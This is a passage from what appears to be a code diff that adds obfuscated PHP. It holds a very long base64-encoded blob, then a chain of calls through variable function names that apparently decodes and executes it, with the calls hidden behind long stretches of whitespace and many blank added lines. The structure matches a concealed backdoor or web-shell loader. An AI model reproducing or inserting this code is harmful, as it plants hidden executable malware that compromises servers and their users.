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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
